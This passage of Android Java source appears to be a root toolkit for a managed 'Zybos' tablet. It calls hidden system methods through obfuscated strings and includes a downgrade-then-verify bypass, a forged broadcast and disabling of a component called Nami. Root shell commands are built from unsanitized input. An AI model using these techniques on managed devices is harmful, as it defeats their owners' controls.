                        Intent intent = new Intent(Obfuscator.dec2(new byte[]{(byte)0x21, (byte)0x39, (byte)0x2f, (byte)0x78, (byte)0x38, (byte)0x23, (byte)0x2d, (byte)0x2f, (byte)0x27, (byte)0x34, (byte)0x23, (byte)0x38, (byte)0x25, (byte)0x78, (byte)0x2b, (byte)0x39, (byte)0x36, (byte)0x78, (byte)0x32, (byte)0x23, (byte)0x31, (byte)0x3e}, (byte)0x42, (byte)0x56));
                        intent.setPackage(Obfuscator.dec2(new byte[]{(byte)0x59, (byte)0xe8, (byte)0x57, (byte)0xa9, (byte)0x40, (byte)0xf2, (byte)0x55, (byte)0xfe, (byte)0x5f, (byte)0xe5, (byte)0x5b, (byte)0xe9, (byte)0x5d, (byte)0xa9, (byte)0x53, (byte)0xe8, (byte)0x4e, (byte)0xa9, (byte)0x4a, (byte)0xe6, (byte)0x5e, (byte)0xa9, (byte)0x5b, (byte)0xf7, (byte)0x4a, (byte)0xf4, (byte)0x4e, (byte)0xe8, (byte)0x48, (byte)0xe2}, (byte)0x3a, (byte)0x87));
                        intent.putExtra("response", data.toString());
                        sendBroadcast(intent);
                        appendLog("[+] 取消广播已发送");
                    } catch (Exception e) {
                        appendLog("[!] 取消广播: " + e.getMessage());
                    }

                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            showSnack("✓ appstore 卡住状态已清除");
                        }
                    });
                } catch (Throwable e2) {
                    appendLog("[!] 清除失败: " + (e2.getMessage() != null ? e2.getMessage() : e2.getClass().getSimpleName()));
                }
            }
        }).start();
    }

    // ==================== 功能14: 降级zpusercenter ====================

    private void doDowngradeZpUserCenter() {
        final EditText input = new EditText(this);
        input.setText("/storage/emulated/0/POC测试/");
        input.setHint("输入zpusercenter APK路径");

        new AlertDialog.Builder(this)
            .setTitle("降级 zpusercenter")
            .setMessage("需要先将低版本 zpusercenter.apk 放到设备上\n\n输入APK路径:")
            .setView(input)
            .setPositiveButton("降级安装", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface d, int w) {
                    String p = input.getText().toString().trim();
                    if (!p.isEmpty()) {
                        appendLog("[*] 降级zpusercenter: " + p);
                        new Thread(new Runnable() {
                            @Override
                            public void run() {
                                final String result = execRootCapture("pm install -d -r '" + p + "'");
                                appendLog("[+] 结果: " + result);
                                runOnUiThread(new Runnable() {
                                    @Override
                                    public void run() {
                                        if (result.contains("Success")) {
                                            showSnack("✓ zpusercenter 降级成功");
                                            new AlertDialog.Builder(ZybosToolsActivity.this)
                                                .setTitle("下一步")
                                                .setMessage("降级成功后，是否打开开发者验证框?")
                                                .setPositiveButton("打开验证框", new DialogInterface.OnClickListener() {
                                                    @Override
                                                    public void onClick(DialogInterface d2, int w2) {
                                                        launchDevVerification();
                                                    }
                                                })
                                                .setNegativeButton("不需要", null)
                                                .show();
                                        } else {
                                            showSnack("✗ " + result);
                                        }
                                    }
                                });
                            }
                        }).start();
                    }
                }
            })
            .setNegativeButton("取消", null)
            .show();
    }

    // ==================== 分类1: 安装管理 (Install Management) ====================

    // isSilentInstallDisallow(String) - 查询指定包是否禁止静默安装
    private void doIsSilentInstallDisallow() {
        if (!checkAvailable()) return;
        showInputDialog("查询静默安装限制", "输入包名", null, new OnInputListener() {
            @Override public void onInput(final String pkg) {
                if (pkg.isEmpty()) { showSnack("请输入包名"); return; }
                runAsync(new Runnable() {
                    public void run() {
                        Object result = tryInvokeGetDirect(Obfuscator.dec(new byte[]{(byte)0x2b, (byte)0x31, (byte)0x11, (byte)0x2b, (byte)0x2e, (byte)0x27, (byte)0x2c, (byte)0x36, (byte)0x0b, (byte)0x2c, (byte)0x31, (byte)0x36, (byte)0x23, (byte)0x2e, (byte)0x2e, (byte)0x06, (byte)0x2b, (byte)0x31, (byte)0x23, (byte)0x2e, (byte)0x2e, (byte)0x2d, (byte)0x35}, (byte)0x42), new Class[]{String.class}, pkg);
                        if (result != null) {
                            boolean val = (Boolean) result;
                            appendLog("[+] isSilentInstallDisallow(" + pkg + ") = " + val);
                            showResultDialog("静默安装限制", "包名: " + pkg + "\n限制状态: " + (val ? "已限制" : "未限制"));
                        } else {
                            showResultDialog("静默安装限制", "查询失败");
                        }
                    }
                });
            }
        });
    }

    // isDisallowInstallPackage() - 查询是否禁止安装应用
    private void doIsDisallowInstallPackage() {
        if (!checkAvailable()) return;
        runAsync(new Runnable() {
            public void run() {
                Object result = tryInvokeGetDirect(Obfuscator.dec(new byte[]{(byte)0x18, (byte)0x02, (byte)0x35, (byte)0x18, (byte)0x02, (byte)0x10, (byte)0x1d, (byte)0x1d, (byte)0x1e, (byte)0x06, (byte)0x38, (byte)0x1f, (byte)0x02, (byte)0x05, (byte)0x10, (byte)0x1d, (byte)0x1d, (byte)0x21, (byte)0x10, (byte)0x12, (byte)0x1a, (byte)0x10, (byte)0x16, (byte)0x14}, (byte)0x71), new Class[0]);
                if (result != null) {
                    boolean val = (Boolean) result;
                    appendLog("[+] isDisallowInstallPackage() = " + val);
                    showResultDialog("安装包限制", "限制状态: " + (val ? "已限制" : "未限制"));
                } else {
                    showResultDialog("安装包限制", "查询失败");
                }
            }
        });
    }

    // ==================== 分类2: 包名/类名管控 (Package/Class Control) ====================

    // setClassListAllow(List) - 设置允许的类列表
    private void doSetClassListAllow() {
        if (!checkAvailable()) return;
        showInputDialog("设置允许类列表", "输入类名(逗号分隔)", null, new OnInputListener() {
            @Override public void onInput(String val) {
                List<String> list = new ArrayList<>();
                for (String s : val.split(",")) {
                    String t = s.trim();
                    if (!t.isEmpty()) list.add(t);
                }
                tryInvoke(Obfuscator.dec(new byte[]{(byte)0x96, (byte)0x80, (byte)0x91, (byte)0xa6, (byte)0x89, (byte)0x84, (byte)0x96, (byte)0x96, (byte)0xa9, (byte)0x8c, (byte)0x96, (byte)0x91, (byte)0xa4, (byte)0x89, (byte)0x89, (byte)0x8a, (byte)0x92}, (byte)0xe5), new Class[]{List.class}, list);
            }
        });
    }

    // isDisallowPackage(String) - 查询包是否被禁
    private void doIsDisallowPackage() {
        if (!checkAvailable()) return;
        showInputDialog("查询包是否被禁", "输入包名", null, new OnInputListener() {
            @Override public void onInput(final String pkg) {
                if (pkg.isEmpty()) return;
                runAsync(new Runnable() {
                    public void run() {
                        Object result = tryInvokeGetDirect(Obfuscator.dec(new byte[]{(byte)0x59, (byte)0x43, (byte)0x74, (byte)0x59, (byte)0x43, (byte)0x51, (byte)0x5c, (byte)0x5c, (byte)0x5f, (byte)0x47, (byte)0x60, (byte)0x51, (byte)0x53, (byte)0x5b, (byte)0x51, (byte)0x57, (byte)0x55}, (byte)0x30), new Class[]{String.class}, pkg);
                        if (result != null) {
                            boolean val = (Boolean) result;
                            appendLog("[+] isDisallowPackage(" + pkg + ") = " + val);
                            showResultDialog("包名限制检查", "包名: " + pkg + "\n限制状态: " + (val ? "已限制" : "未限制"));
                        } else {
                            showResultDialog("包名限制检查", "查询失败");
                        }
                    }
                });
            }
        });
    }

    // isDisallowClass(String) - 查询类是否被禁
    private void doIsDisallowClass() {
        if (!checkAvailable()) return;
        showInputDialog("查询类是否被禁", "输入完整类名", null, new OnInputListener() {
            @Override public void onInput(final String cls) {
                if (cls.isEmpty()) return;
                runAsync(new Runnable() {
                    public void run() {
                        Object result = tryInvokeGetDirect(Obfuscator.dec(new byte[]{(byte)0x94, (byte)0x8e, (byte)0xb9, (byte)0x94, (byte)0x8e, (byte)0x9c, (byte)0x91, (byte)0x91, (byte)0x92, (byte)0x8a, (byte)0xbe, (byte)0x91, (byte)0x9c, (byte)0x8e, (byte)0x8e}, (byte)0xfd), new Class[]{String.class}, cls);
                        if (result != null) {
                            boolean val = (Boolean) result;
                            appendLog("[+] isDisallowClass(" + cls + ") = " + val);
                            showResultDialog("类名限制检查", "类名: " + cls + "\n限制状态: " + (val ? "已限制" : "未限制"));
                        } else {
                            showResultDialog("类名限制检查", "查询失败");
                        }
                    }
                });
            }
        });
    }

    // isAllowClass(String) - 查询类是否允许
    private void doIsAllowClass() {
        if (!checkAvailable()) return;
        showInputDialog("查询类是否允许", "输入完整类名", null, new OnInputListener() {
            @Override public void onInput(final String cls) {
                if (cls.isEmpty()) return;
                runAsync(new Runnable() {
                    public void run() {
                        Object result = tryInvokeGetDirect(Obfuscator.dec(new byte[]{(byte)0xd8, (byte)0xc2, (byte)0xf0, (byte)0xdd, (byte)0xdd, (byte)0xde, (byte)0xc6, (byte)0xf2, (byte)0xdd, (byte)0xd0, (byte)0xc2, (byte)0xc2}, (byte)0xb1), new Class[]{String.class}, cls);
                        if (result != null) {
                            boolean val = (Boolean) result;
                            appendLog("[+] isAllowClass(" + cls + ") = " + val);
                            showResultDialog("类名允许检查", "类名: " + cls + "\n允许状态: " + (val ? "已允许" : "未允许"));
                        } else {
                            showResultDialog("类名允许检查", "查询失败");
                        }
                    }
                });
            }
        });
    }

    // ==================== 分类3: 系统控制 (System Control) ====================

    // lockScreen() - 立即锁屏
    private void doLockScreen() {
        if (!checkAvailable()) return;
        appendLog("[*] 尝试锁屏...");
        runAsync(new Runnable() {
            public void run() {
                // 1. 先尝试 transact
                boolean ok = tryInvokeDirect(Obfuscator.dec(new byte[]{(byte)0xc3, (byte)0xc0, (byte)0xcc, (byte)0xc4, (byte)0xfc, (byte)0xcc, (byte)0xdd, (byte)0xca, (byte)0xca, (byte)0xc1}, (byte)0xaf), new Class[0]);
                if (!ok) {
                    appendLog("[*] transact/反射均失败, 尝试root shell回退...");
                    // 2. root shell 回退: input keyevent 26 (电源键)
                    try {
                        Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", "input keyevent 26"});
                        int exit = p.waitFor();
                        if (exit == 0) {
                            appendLog("[+] lockScreen OK (root shell: input keyevent 26)");
                            runOnUiThread(new Runnable() {
                                @Override public void run() { showSnack("✓ 已锁屏 (root)"); }
                            });
                        } else {
                            // 3. 非root尝试: 使用AccessibilityService或DevicePolicyManager
                            appendLog("[!] root shell失败(exit=" + exit + "), 尝试DeviceAdmin...");
                            try {
                                android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                                dpm.lockNow();
                                appendLog("[+] lockScreen OK (DevicePolicyManager)");
                                runOnUiThread(new Runnable() {
                                    @Override public void run() { showSnack("✓ 已锁屏 (DeviceAdmin)"); }
                                });
                            } catch (Throwable e3) {
                                appendLog("[!] lockScreen 所有方式均失败: " + e3.getMessage());
                                runOnUiThread(new Runnable() {
                                    @Override public void run() { showSnack("✗ 锁屏失败 (需root或设备管理器权限)"); }
                                });
                            }
                        }
                    } catch (Throwable e2) {
                        appendLog("[!] lockScreen shell失败: " + e2.getMessage());
                        runOnUiThread(new Runnable() {
                            @Override public void run() { showSnack("✗ 锁屏失败"); }
                        });
                    }
                } else {
                    runOnUiThread(new Runnable() {
                        @Override public void run() { showSnack("✓ 已锁屏"); }
                    });
                }
            }
        });
    }

    // isDisallowUSB() - 查询USB是否被禁
    private void doIsDisallowUSB() {
        if (!checkAvailable()) return;
        runAsync(new Runnable() {
            public void run() {
                Object result = tryInvokeGetDirect(Obfuscator.dec(new byte[]{(byte)0x35, (byte)0x2f, (byte)0x18, (byte)0x35, (byte)0x2f, (byte)0x3d, (byte)0x30, (byte)0x30, (byte)0x33, (byte)0x2b, (byte)0x09, (byte)0x0f, (byte)0x1e}, (byte)0x5c), new Class[0]);
                if (result != null) {
                    boolean val = (Boolean) result;
                    appendLog("[+] isDisallowUSB() = " + val);
                    showResultDialog("USB限制", "USB限制状态: " + (val ? "已限制" : "未限制"));
                } else {
                    showResultDialog("USB限制", "查询失败");
                }
            }
        });
    }

    // disableNami(Context) - 禁用Nami
    private void doDisableNami() {
        if (!checkAvailable()) return;
        tryInvoke("disableNami", new Class[]{Context.class}, ZybosToolsActivity.this);
    }

    // isAdbEnabled() - 查询ADB是否开启
    private void doIsAdbEnabled() {
        if (!checkAvailable()) return;
        runAsync(new Runnable() {
            public void run() {
                Object result = tryInvokeGetDirect(Obfuscator.dec(new byte[]{(byte)0x32, (byte)0x28, (byte)0x1a, (byte)0x3f, (byte)0x39, (byte)0x1e, (byte)0x35, (byte)0x3a, (byte)0x39, (byte)0x37, (byte)0x3e, (byte)0x3f}, (byte)0x5b), new Class[0]);
                if (result != null) {
                    boolean val = (Boolean) result;
                    appendLog("[+] isAdbEnabled() = " + val);
                    showResultDialog("ADB状态", "ADB: " + (val ? "已启用" : "未启用"));
                } else {
                    showResultDialog("ADB状态", "查询失败");
                }
            }
        });
    }

    // ==================== 分类4: 显示设置 (Display Settings) ====================

    // setNightDisplayActivated(boolean) - 护眼模式开关
    private void doSetNightDisplayActivated() {
        if (!checkAvailable()) return;
        new AlertDialog.Builder(this)
            .setTitle("护眼模式开关")
            .setItems(new String[]{"开启护眼模式", "关闭护眼模式"}, new DialogInterface.OnClickListener() {
                @Override public void onClick(DialogInterface d, int w) {
                    final boolean enabled = (w == 0);
                    runAsync(new Runnable() {
                        @Override public void run() {
                            appendLog("---------- 设置护眼模式: " + (enabled ? "开启" : "关闭") + " ----------");
                            // 方式1: transact + 反射
                            String methodName = Obfuscator.dec(new byte[]{(byte)0xb6, (byte)0xa0, (byte)0xb1, (byte)0x8b, (byte)0xac, (byte)0xa2, (byte)0xad, (byte)0xb1, (byte)0x81, (byte)0xac, (byte)0xb6, (byte)0xb5, (byte)0xa9, (byte)0xa4, (byte)0xbc, (byte)0x84, (byte)0xa6, (byte)0xb1, (byte)0xac, (byte)0xb3, (byte)0xa4, (byte)0xb1, (byte)0xa0, (byte)0xa1}, (byte)0xc5);
                            if (tryInvokeDirect(methodName, new Class[]{Boolean.TYPE}, enabled)) {
                                return;
                            }
                            // 方式2: root shell回退 (settings put secure night_display_activated)
                            appendLog("[*] transact/反射均失败, 尝试root shell回退...");
                            String val = enabled ? "1" : "0";
                            String result = execRootCapture("settings put secure night_display_activated " + val);
                            if (result != null) {
                                appendLog("[+] setNightDisplayActivated OK (root shell)");
                            } else {
                                appendLog("[!] setNightDisplayActivated 失败 (所有方式均不可用)");
                            }
                        }
                    });
                }
            })
            .show();
    }

    // setNightDisplayColorTemperature(int) - 设置色温
    private void doSetNightDisplayColorTemp() {
        if (!checkAvailable()) return;
        showInputDialog("设置色温", "输入色温值(如 3000-6500)", "4500", new OnInputListener() {
            @Override public void onInput(String val) {
                try {
                    final int temp = Integer.parseInt(val);
                    runAsync(new Runnable() {
                        @Override public void run() {
                            appendLog("---------- 设置色温: " + temp + "K ----------");
                            String methodName = Obfuscator.dec(new byte[]{(byte)0x51, (byte)0x47, (byte)0x56, (byte)0x6c, (byte)0x4b, (byte)0x45, (byte)0x4a, (byte)0x56, (byte)0x66, (byte)0x4b, (byte)0x51, (byte)0x52, (byte)0x4e, (byte)0x43, (byte)0x5b, (byte)0x61, (byte)0x4d, (byte)0x4e, (byte)0x4d, (byte)0x50, (byte)0x76, (byte)0x47, (byte)0x4f, (byte)0x52, (byte)0x47, (byte)0x50, (byte)0x43, (byte)0x56, (byte)0x57, (byte)0x50, (byte)0x47}, (byte)0x22);
                            if (tryInvokeDirect(methodName, new Class[]{Integer.TYPE}, temp)) {
                                return;
                            }
                            // root shell回退
                            appendLog("[*] transact/反射均失败, 尝试root shell回退...");
                            String result = execRootCapture("settings put secure night_display_color_temperature " + temp);
                            if (result != null) {
                                appendLog("[+] setNightDisplayColorTemperature OK (root shell)");
                            } else {
                                appendLog("[!] setNightDisplayColorTemperature 失败 (所有方式均不可用)");
                            }
                        }
                    });
                } catch (NumberFormatException e) {
                    showSnack("请输入数字");
                }
            }
        });
    }

    // getNightDisplayColorTemperature() - 获取当前色温
    private void doGetNightDisplayColorTemp() {
        if (!checkAvailable()) return;
        runAsync(new Runnable() {
            public void run() {
                appendLog("---------- 获取色温 ----------");
                String methodName = Obfuscator.dec(new byte[]{(byte)0x7b, (byte)0x79, (byte)0x68, (byte)0x52, (byte)0x75, (byte)0x7b, (byte)0x74, (byte)0x68, (byte)0x58, (byte)0x75, (byte)0x6f, (byte)0x6c, (byte)0x70, (byte)0x7d, (byte)0x65, (byte)0x5f, (byte)0x73, (byte)0x70, (byte)0x73, (byte)0x6e, (byte)0x48, (byte)0x79, (byte)0x71, (byte)0x6c, (byte)0x79, (byte)0x6e, (byte)0x7d, (byte)0x68, (byte)0x69, (byte)0x6e, (byte)0x79}, (byte)0x1c);
                Object result = tryInvokeGetDirect(methodName, new Class[0]);
                if (result != null) {
                    int val = (Integer) result;
                    appendLog("[+] getNightDisplayColorTemperature() = " + val);
                    showResultDialog("夜间色温", "色温值: " + val);
                } else {
                    // root shell回退
                    appendLog("[*] transact/反射均失败, 尝试root shell回退...");
                    String output = execRootCapture("settings get secure night_display_color_temperature");
                    if (output != null && !output.isEmpty() && !"null".equals(output.trim())) {
                        appendLog("[+] getNightDisplayColorTemperature = " + output.trim() + " (root shell)");
                        showResultDialog("夜间色温", "色温值: " + output.trim());
                    } else {
                        showResultDialog("夜间色温", "查询失败");
                    }
                }
            }
        });
    }

    // isNightDisplayActivated() - 查询护眼模式状态
    private void doIsNightDisplayActivated() {
        if (!checkAvailable()) return;
        runAsync(new Runnable() {
            public void run() {
                appendLog("---------- 查询护眼状态 ----------");
                String methodName = Obfuscator.dec(new byte[]{(byte)0xd3, (byte)0xc9, (byte)0xf4, (byte)0xd3, (byte)0xdd, (byte)0xd2, (byte)0xce, (byte)0xfe, (byte)0xd3, (byte)0xc9, (byte)0xca, (byte)0xd6, (byte)0xdb, (byte)0xc3, (byte)0xfb, (byte)0xd9, (byte)0xce, (byte)0xd3, (byte)0xcc, (byte)0xdb, (byte)0xce, (byte)0xdf, (byte)0xde}, (byte)0xba);
                Object result = tryInvokeGetDirect(methodName, new Class[0]);
                if (result != null) {
                    boolean val = (Boolean) result;
                    appendLog("[+] isNightDisplayActivated() = " + val);
                    showResultDialog("夜间显示", "夜间显示: " + (val ? "已开启" : "未开启"));
                } else {
                    // root shell回退
                    appendLog("[*] transact/反射均失败, 尝试root shell回退...");
                    String output = execRootCapture("settings get secure night_display_activated");
                    if (output != null && !output.isEmpty() && !"null".equals(output.trim())) {
                        boolean val = "1".equals(output.trim());
                        appendLog("[+] isNightDisplayActivated = " + val + " (root shell)");
                        showResultDialog("夜间显示", "夜间显示: " + (val ? "已开启" : "未开启"));
                    } else {
                        showResultDialog("夜间显示", "查询失败");
                    }
                }
            }
        });
    }

    // setDefaultBrowser(String) - 设置默认浏览器
    private void doSetDefaultBrowser() {
        if (!checkAvailable()) return;
        showInputDialog("设置默认浏览器", "输入浏览器包名", Obfuscator.dec2(new byte[]{(byte)0x28, (byte)0x8c, (byte)0x26, (byte)0xcd, (byte)0x2a, (byte)0x8d, (byte)0x2f, (byte)0x91, (byte)0x24, (byte)0x8a, (byte)0x2f, (byte)0xcd, (byte)0x29, (byte)0x91, (byte)0x24, (byte)0x94, (byte)0x38, (byte)0x86, (byte)0x39}, (byte)0x4b, (byte)0xe3), new OnInputListener() {
            @Override public void onInput(String pkg) {
                if (pkg.isEmpty()) return;
                tryInvoke(Obfuscator.dec(new byte[]{(byte)0xd7, (byte)0xc1, (byte)0xd0, (byte)0xe0, (byte)0xc1, (byte)0xc2, (byte)0xc5, (byte)0xd1, (byte)0xc8, (byte)0xd0, (byte)0xe6, (byte)0xd6, (byte)0xcb, (byte)0xd3, (byte)0xd7, (byte)0xc1, (byte)0xd6}, (byte)0xa4), new Class[]{String.class}, pkg);
            }
        });
    }

    // ==================== 分类5: 电池/硬件 (Battery/Hardware) ====================

    // getChargerIbat() - 获取充电电流
    private void doGetChargerIbat() {
        if (!checkAvailable()) return;
        runAsync(new Runnable() {
            public void run() {
                Object result = tryInvokeGetDirect(Obfuscator.dec(new byte[]{(byte)0x5d, (byte)0x5f, (byte)0x4e, (byte)0x79, (byte)0x52, (byte)0x5b, (byte)0x48, (byte)0x5d, (byte)0x5f, (byte)0x48, (byte)0x73, (byte)0x58, (byte)0x5b, (byte)0x4e}, (byte)0x3a), new Class[0]);
                if (result != null) {
                    String val = (String) result;
                    appendLog("[+] getChargerIbat() = " + val);
                    showResultDialog("充电电流", "电流: " + val);
                } else {
                    showResultDialog("充电电流", "查询失败");
                }
            }
        });
    }

    // getBatteryAgingFactor() - 获取电池老化系数
    private void doGetBatteryAgingFactor() {
        if (!checkAvailable()) return;
        runAsync(new Runnable() {
            public void run() {
                Object result = tryInvokeGetDirect(Obfuscator.dec(new byte[]{(byte)0x08, (byte)0x0a, (byte)0x1b, (byte)0x2d, (byte)0x0e, (byte)0x1b, (byte)0x1b, (byte)0x0a, (byte)0x1d, (byte)0x16, (byte)0x2e, (byte)0x08, (byte)0x06, (byte)0x01, (byte)0x08, (byte)0x29, (byte)0x0e, (byte)0x0c, (byte)0x1b, (byte)0x00, (byte)0x1d}, (byte)0x6f), new Class[0]);
                if (result != null) {
                    String val = (String) result;
                    appendLog("[+] getBatteryAgingFactor() = " + val);
                    showResultDialog("电池老化", "老化因子: " + val);
                } else {
                    showResultDialog("电池老化", "查询失败");
                }
            }
        });
    }

    // getBatteryCycleCount() - 获取电池循环次数
    private void doGetBatteryCycleCount() {
        if (!checkAvailable()) return;
        runAsync(new Runnable() {
            public void run() {
                Object result = tryInvokeGetDirect(Obfuscator.dec(new byte[]{(byte)0x0c, (byte)0x0e, (byte)0x1f, (byte)0x29, (byte)0x0a, (byte)0x1f, (byte)0x1f, (byte)0x0e, (byte)0x19, (byte)0x12, (byte)0x28, (byte)0x12, (byte)0x08, (byte)0x07, (byte)0x0e, (byte)0x28, (byte)0x04, (byte)0x1e, (byte)0x05, (byte)0x1f}, (byte)0x6b), new Class[0]);
                if (result != null) {
                    String val = (String) result;
                    appendLog("[+] getBatteryCycleCount() = " + val);
                    showResultDialog("电池循环", "循环次数: " + val);
                } else {
                    showResultDialog("电池循环", "查询失败");
                }
            }
        });
    }

    // getBatteryHealth() - 获取电池健康度
    private void doGetBatteryHealth() {
        if (!checkAvailable()) return;
        runAsync(new Runnable() {
            public void run() {
                Object result = tryInvokeGetDirect(Obfuscator.dec(new byte[]{(byte)0x21, (byte)0x23, (byte)0x32, (byte)0x04, (byte)0x27, (byte)0x32, (byte)0x32, (byte)0x23, (byte)0x34, (byte)0x3f, (byte)0x0e, (byte)0x23, (byte)0x27, (byte)0x2a, (byte)0x32, (byte)0x2e}, (byte)0x46), new Class[0]);
                if (result != null) {
                    String val = (String) result;
                    appendLog("[+] getBatteryHealth() = " + val);
                    showResultDialog("电池健康", "健康度: " + val);
                } else {
                    showResultDialog("电池健康", "查询失败");
                }
            }
        });
    }

    // getZybHardwareCompA~J - 调用全部10个硬件组件查询并记录结果
    private void doGetAllHardwareComp() {
        if (!checkAvailable()) return;
        appendLog("---------- 硬件组件信息 (A-J) ----------");
        final String[] methods = {
            Obfuscator.dec(new byte[]{(byte)0xa3, (byte)0xa1, (byte)0xb0, (byte)0x9e, (byte)0xbd, (byte)0xa6, (byte)0x8c, (byte)0xa5, (byte)0xb6, (byte)0xa0, (byte)0xb3, (byte)0xa5, (byte)0xb6, (byte)0xa1, (byte)0x87, (byte)0xab, (byte)0xa9, (byte)0xb4, (byte)0x85}, (byte)0xc4), Obfuscator.dec(new byte[]{(byte)0xd8, (byte)0xda, (byte)0xcb, (byte)0xe5, (byte)0xc6, (byte)0xdd, (byte)0xf7, (byte)0xde, (byte)0xcd, (byte)0xdb, (byte)0xc8, (byte)0xde, (byte)0xcd, (byte)0xda, (byte)0xfc, (byte)0xd0, (byte)0xd2, (byte)0xcf, (byte)0xfd}, (byte)0xbf), Obfuscator.dec(new byte[]{(byte)0xd1, (byte)0xd3, (byte)0xc2, (byte)0xec, (byte)0xcf, (byte)0xd4, (byte)0xfe, (byte)0xd7, (byte)0xc4, (byte)0xd2, (byte)0xc1, (byte)0xd7, (byte)0xc4, (byte)0xd3, (byte)0xf5, (byte)0xd9, (byte)0xdb, (byte)0xc6, (byte)0xf5}, (byte)0xb6),
            Obfuscator.dec(new byte[]{(byte)0x44, (byte)0x46, (byte)0x57, (byte)0x79, (byte)0x5a, (byte)0x41, (byte)0x6b, (byte)0x42, (byte)0x51, (byte)0x47, (byte)0x54, (byte)0x42, (byte)0x51, (byte)0x46, (byte)0x60, (byte)0x4c, (byte)0x4e, (byte)0x53, (byte)0x67}, (byte)0x23), Obfuscator.dec(new byte[]{(byte)0xcb, (byte)0xc9, (byte)0xd8, (byte)0xf6, (byte)0xd5, (byte)0xce, (byte)0xe4, (byte)0xcd, (byte)0xde, (byte)0xc8, (byte)0xdb, (byte)0xcd, (byte)0xde, (byte)0xc9, (byte)0xef, (byte)0xc3, (byte)0xc1, (byte)0xdc, (byte)0xe9}, (byte)0xac), Obfuscator.dec(new byte[]{(byte)0xd4, (byte)0xd6, (byte)0xc7, (byte)0xe9, (byte)0xca, (byte)0xd1, (byte)0xfb, (byte)0xd2, (byte)0xc1, (byte)0xd7, (byte)0xc4, (byte)0xd2, (byte)0xc1, (byte)0xd6, (byte)0xf0, (byte)0xdc, (byte)0xde, (byte)0xc3, (byte)0xf5}, (byte)0xb3),
            Obfuscator.dec(new byte[]{(byte)0x5b, (byte)0x59, (byte)0x48, (byte)0x66, (byte)0x45, (byte)0x5e, (byte)0x74, (byte)0x5d, (byte)0x4e, (byte)0x58, (byte)0x4b, (byte)0x5d, (byte)0x4e, (byte)0x59, (byte)0x7f, (byte)0x53, (byte)0x51, (byte)0x4c, (byte)0x7b}, (byte)0x3c), Obfuscator.dec(new byte[]{(byte)0xfe, (byte)0xfc, (byte)0xed, (byte)0xc3, (byte)0xe0, (byte)0xfb, (byte)0xd1, (byte)0xf8, (byte)0xeb, (byte)0xfd, (byte)0xee, (byte)0xf8, (byte)0xeb, (byte)0xfc, (byte)0xda, (byte)0xf6, (byte)0xf4, (byte)0xe9, (byte)0xd1}, (byte)0x99), Obfuscator.dec(new byte[]{(byte)0xac, (byte)0xae, (byte)0xbf, (byte)0x91, (byte)0xb2, (byte)0xa9, (byte)0x83, (byte)0xaa, (byte)0xb9, (byte)0xaf, (byte)0xbc, (byte)0xaa, (byte)0xb9, (byte)0xae, (byte)0x88, (byte)0xa4, (byte)0xa6, (byte)0xbb, (byte)0x82}, (byte)0xcb),
            Obfuscator.dec(new byte[]{(byte)0x28, (byte)0x2a, (byte)0x3b, (byte)0x15, (byte)0x36, (byte)0x2d, (byte)0x07, (byte)0x2e, (byte)0x3d, (byte)0x2b, (byte)0x38, (byte)0x2e, (byte)0x3d, (byte)0x2a, (byte)0x0c, (byte)0x20, (byte)0x22, (byte)0x3f, (byte)0x05}, (byte)0x4f)
        };
        runAsync(new Runnable() {
            @Override
            public void run() {
                final StringBuilder sb = new StringBuilder();
                for (String m : methods) {
                    Object result = tryInvokeGetDirect(m, new Class[0]);
                    if (result != null) {
                        sb.append(m).append(": ").append(result.toString()).append("\n");
                    } else {
                        sb.append(m).append(": 查询失败\n");
                    }
                }
                appendLog("---------- 硬件组件扫描完成 ----------");
                showResultDialog("硬件信息", sb.toString().trim());
            }
        });
    }

    // ==================== 分类6: sysfs读取 (sysfs Read) ====================

    // getSysfsControl(String path) - 读取sysfs节点
    private void doGetSysfsControl() {
        if (!checkAvailable()) return;
        showInputDialog("读取sysfs节点", "输入sysfs路径", "/sys/class/", new OnInputListener() {
            @Override public void onInput(String path) {
                if (path.isEmpty()) return;
                appendLog("[*] 读取sysfs: " + path);
                runAsync(new Runnable() {
                    public void run() {
                        // 1. 先尝试 transact/反射
                        Object result = tryInvokeGetDirect("getSysfsControl", new Class[]{String.class}, path);
                        if (result != null) {
                            appendLog("[+] getSysfsControl = " + result);
                            return;
                        }
                        // 2. root shell 回退: cat 读取
                        appendLog("[*] transact/反射失败, 尝试root shell...");
                        String output = execRootCapture("cat " + path + " 2>/dev/null");
                        if (output != null && !output.isEmpty() && !output.startsWith("错误")) {
                            appendLog("[+] sysfs (root): " + output.trim());
                            final String val = output.trim();
                            runOnUiThread(new Runnable() {
                                @Override public void run() { showResultDialog("sysfs读取", path + "\n\n值: " + val); }
                            });
                        } else {
                            appendLog("[!] sysfs读取失败 (所有方式)");
                            runOnUiThread(new Runnable() {
                                @Override public void run() { showSnack("✗ sysfs读取失败"); }
                            });
                        }
                    }
                });
            }
        });
    }

    // ==================== 分类7: 免打扰 (DND) ====================

    // addInDndList(String) - 添加到免打扰列表
    private void doAddInDndList() {
        if (!checkAvailable()) return;
        showInputDialog("添加免打扰", "输入包名", null, new OnInputListener() {
            @Override public void onInput(String pkg) {
                if (pkg.isEmpty()) return;
                tryInvoke(Obfuscator.dec(new byte[]{(byte)0x92, (byte)0x97, (byte)0x97, (byte)0xba, (byte)0x9d, (byte)0xb7, (byte)0x9d, (byte)0x97, (byte)0xbf, (byte)0x9a, (byte)0x80, (byte)0x87}, (byte)0xf3), new Class[]{String.class}, pkg);
            }
        });
    }

    // removeFromDndList(String) - 从免打扰列表移除
    private void doRemoveFromDndList() {
        if (!checkAvailable()) return;
        showInputDialog("移除免打扰", "输入包名", null, new OnInputListener() {
            @Override public void onInput(String pkg) {
                if (pkg.isEmpty()) return;
                tryInvoke(Obfuscator.dec(new byte[]{(byte)0x9f, (byte)0x88, (byte)0x80, (byte)0x82, (byte)0x9b, (byte)0x88, (byte)0xab, (byte)0x9f, (byte)0x82, (byte)0x80, (byte)0xa9, (byte)0x83, (byte)0x89, (byte)0xa1, (byte)0x84, (byte)0x9e, (byte)0x99}, (byte)0xed), new Class[]{String.class}, pkg);
            }
        });
    }

    // isInDndList(String) - 查询是否在免打扰列表
    private void doIsInDndList() {
        if (!checkAvailable()) return;
        showInputDialog("查询免打扰", "输入包名", null, new OnInputListener() {
            @Override public void onInput(final String pkg) {
                if (pkg.isEmpty()) return;
                runAsync(new Runnable() {
